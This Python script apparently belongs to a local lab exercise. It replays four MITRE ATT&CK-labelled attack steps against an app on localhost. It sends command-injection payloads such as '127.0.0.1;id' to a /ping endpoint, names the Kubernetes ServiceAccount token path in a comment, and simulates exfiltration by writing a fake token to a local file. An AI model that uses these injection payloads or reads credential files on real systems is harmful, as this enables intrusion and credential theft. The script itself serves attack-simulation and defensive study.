"""
Sequential attack script - simple version, no design patterns yet.
Replays 4 steps inspired by MITRE ATT&CK against the target-app.
"""
import time
import requests

TARGET = "http://localhost:8000"


def step_1_exploit_injection():
    """T1059 - Command and Scripting Interpreter (via injection)."""
    print("[1] Exploiting command injection...")
    r = requests.get(f"{TARGET}/ping", params={"host": "127.0.0.1;id"})
    print(f"    -> response: {r.json()['stdout'].strip()}")
    time.sleep(1)


def step_2_discovery():
    """T1082 - System Information Discovery."""
    print("[2] System discovery...")
    r = requests.get(f"{TARGET}/ping", params={"host": "127.0.0.1;uname -a"})
    print(f"    -> response: {r.json()['stdout'].strip()}")
    time.sleep(1)


def step_3_credential_access():
    """T1552 - Unsecured Credentials (simulated ServiceAccount token)."""
    print("[3] Reading a simulated token...")
    # On a real cluster: cat /var/run/secrets/kubernetes.io/serviceaccount/token
    fake_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2Uta2V5LWlkIn0.FAKE.TOKEN"
    print(f"    -> simulated token found: {fake_token[:20]}...")
    time.sleep(1)
    return fake_token


def step_4_exfiltration(token: str):
    """T1041 - Exfiltration Over C2 Channel (simulated: local write)."""
    print("[4] Simulated exfiltration...")
    with open("exfiltrated.txt", "a") as f:
        f.write(f"stolen token: {token}\n")
    print("    -> data written to exfiltrated.txt")


def main():
    start = time.time()
    print("=== Starting attack scenario (Cutlass) ===")
    step_1_exploit_injection()
    step_2_discovery()
    token = step_3_credential_access()
    step_4_exfiltration(token)
    duration = time.time() - start
    print(f"=== Scenario finished in {duration:.2f}s ===")


if __name__ == "__main__":
    main()
